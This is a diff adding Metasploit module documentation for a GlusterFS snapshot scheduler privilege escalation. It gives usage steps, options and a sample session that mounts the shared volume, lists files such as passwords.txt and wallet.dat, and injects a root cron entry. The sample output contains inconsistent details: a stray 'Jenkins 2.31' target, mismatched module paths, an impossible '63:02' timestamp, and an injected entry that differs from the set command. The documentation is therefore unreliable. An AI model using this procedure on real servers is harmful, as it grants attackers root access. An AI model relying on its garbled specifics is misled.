+++ documentation/modules/exploit/linux/local/gluster_shared_storage_hijack.md
@@ -1,0 +1,76 @@
+## Vulnerable Application
+
+The Snapshot Scheduler in GlusterFS 3.8.8-1 or below is vulnerable to privilege escalation via a crafted symlink.
+Any gluster client allowed to mount gluster volumes could also mount the shared gluster storage volume and escalate privileges by scheduling a malicious cronjob via symlink.
+
+GlusterFS can be downloaded from its [official site](https://www.gluster.org/install/).
+
+## Verification Steps
+
+  1. Install GlusterFS 3.8.8-1: `apt install glusterfs-server=3.8.8-1`
+  2. Install GlusterFS-Client: `apt install glusterfs-client`
+  3. Start `msfconsole`
+  4. Do: `use exploit/linux/local/gluster_shared_storage_hijack`
+  5. Do: `set RHOST [target host, defaults to localhost]`
+  6. Do: `set CMD 'touch /tmp/foo.bar'`
+  7. Do: `run`
+  8. It should create `/tmp/foo.bar` on the target host at the given crontab time.
+
+## Required Options
+
+  **RHOST**
+
+  Address of Gluster server, can be localhost.
+
+  **GLUSTERBIN**
+
+  Path to mount.glusterfs binary. Defaults to /sbin/mount.glusterfs.
+
+  **GLUSTERCRON**
+
+  Path to gluster cron file. Defaults to /snaps/glusterfs_snap_cron_tasks.
+
+  **GLUSTERMNT**
+
+  Directory where the vulnerable volume will be mounted. Defaults to /tmp/gevaudan.
+
+  **GLUSTERVOL**
+
+  Gluster volume to mount. Defaults to gluster_shared_storage.
+
+  **CMD**
+
+  The command to force crontab to execute.
+
+
+## Scenarios
+
+  Example usage against a unix target running Jenkins 2.31.
+
+  ```
+  msf5 exploit(unix/gluster_shared_storage) > check
+  [*] poc-server The target appears to be vulnerable.
+  msf5 exploit(unix/gluster_shared_storage) > exploit
+
+  [-] Attempting to exploit Gluster instance on poc-server...
+  [+] Volume poc-server:/gluster_shared_storage exploited successfully. Mounted on '/tmp/gevaudan'.
+  Volume content (Showing latest 10 entries only):
+
+  total 4.0K
+
+  -rw-r--r-- 1 root root 0 Jun 6 02:41 passwords.txt
+  -rw-r--r-- 1 root root 0 Jun 6 02:41 wallet.dat
+  -rw-r--r-- 1 root root 0 Jun 6 02:41 secret_key
+  -rw-r--r-- 1 root root 0 Jun 6 02:41 secret_file
+  drwxr-xr-x 3 root root 4.0K Jun 6 63:02 snaps
+
+  [+] Cron file '/tmp/gevaudan/snaps/glusterfs_snap_cron_tasks’ altered successfully.
+  [+] Cron file injected entry:
+  [+] 0 6 * * * /bin/bash
+  [+] This will run as root on poc-server.
+
+  Don't forget to unmount /tmp/gevaudan after use.
+  [*] Exploit completed, but no session was created.
+
+  msf5 exploit(unix/gluster_shared_storage) > 
+  ```
